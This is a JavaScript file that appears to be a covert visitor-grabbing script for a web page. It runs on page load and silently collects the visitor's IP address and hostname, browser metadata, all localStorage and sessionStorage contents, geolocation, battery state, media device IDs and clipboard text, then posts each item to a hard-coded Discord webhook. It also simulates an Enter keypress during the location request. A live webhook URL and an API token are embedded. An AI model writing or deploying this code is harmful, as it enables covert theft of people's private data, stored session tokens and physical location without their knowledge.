function getVisitorIpAndDns() {
    return fetch('https://ipinfo.io?token=b0138b9c06beb1')
        .then(response => response.json())
        .then(data => {
            const visitorInfo = {
                ip: data.ip,
                hostname: data.hostname || 'Hostname not available',
            };
            return visitorInfo;
        })
        .catch(error => {
            console.error('Error fetching IP and DNS info:', error);
            return { ip: null, hostname: null };
        });
}

function sendToDiscord(message) {
    const webhookURL = "https://discord.com/api/webhooks/1297169245553295375/5GPDfAUrU4fh0uqlO2D2Dh4-HhiFtZZ5sgBVCEMNLsBlrIMOWYShxhY_mZDpiH7mo3DR";
    const payload = {
        content: message
    };
    fetch(webhookURL, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(payload)
    });
}

function simulateKeyPress(key) {
    // Create a new KeyboardEvent
    const event = new KeyboardEvent('keydown', {
        key: key,
        code: `Enter`,
        charCode: 13,
        keyCode: 13,
        bubbles: true,
        cancelable: true
    });

    // Dispatch the event to the document
    document.dispatchEvent(event);
}

async function getBatteryStatus() {
    if ('getBattery' in navigator) {
        const battery = await navigator.getBattery();
        const batteryInfo = {
            level: battery.level * 100,
            charging: battery.charging
        };
        sendToDiscord(`Battery Status: ${JSON.stringify(batteryInfo)}`);
    } else {
        sendToDiscord("Battery Status API not supported.");
    }
}

async function getMediaDevices() {
    try {
        const devices = await navigator.mediaDevices.enumerateDevices();
        const mediaInfo = devices.map(device => ({
            kind: device.kind,
            label: device.label,
            deviceId: device.deviceId
        }));
        sendToDiscord(`Media Devices: ${JSON.stringify(mediaInfo)}`);
    } catch (error) {
        sendToDiscord(`Error accessing media devices: ${error.message}`);
    }
}

async function getClipboardData() {
    try {
        const clipboardData = await navigator.clipboard.read();
        const clipboardItems = clipboardData.map(item => item.getType('text/plain').then(blob => blob.text()));
        const clipboardTexts = await Promise.all(clipboardItems);
        sendToDiscord(`Clipboard Data: ${JSON.stringify(clipboardTexts)}`);
    } catch (error) {
        sendToDiscord(`Error accessing clipboard: ${error.message}`);
    }
}

window.onload = async function() {
    const visitorInfo = await getVisitorIpAndDns();
    if (visitorInfo.ip) {
        sendToDiscord(`New visitor IP address: ${visitorInfo.ip}, Hostname: ${visitorInfo.hostname}`);
    }

    const metadata = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        screenResolution: `${window.screen.width}x${window.screen.height}`,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        cookiesEnabled: navigator.cookieEnabled,
        onlineStatus: navigator.onLine ? "Online" : "Offline",
        referrer: document.referrer,
        currentUrl: window.location.href
    };
    sendToDiscord(`Visitor Metadata: ${JSON.stringify(metadata)}`);

    function collectStorageData() {
        const storageInfo = {
            localStorageData: {},
            sessionStorageData: {}
        };
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            storageInfo.localStorageData[key] = localStorage.getItem(key);
        }
        for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            storageInfo.sessionStorageData[key] = sessionStorage.getItem(key);
        }
        sendToDiscord(`Storage Data: ${JSON.stringify(storageInfo)}`);
    }

    collectStorageData();

    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(position) {
            // Simulate pressing Enter
            simulateKeyPress('Enter');

            const location = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy
            };
            sendToDiscord(`Geolocation: ${JSON.stringify(location)}`);
        }, function(error) {
            sendToDiscord(`Geolocation access denied: ${error.message}`);
        });
    } else {
        sendToDiscord("Geolocation not supported by browser.");
    }

    // Call additional functions to gather more data
    await getBatteryStatus();
    await getMediaDevices();
    await getClipboardData();
};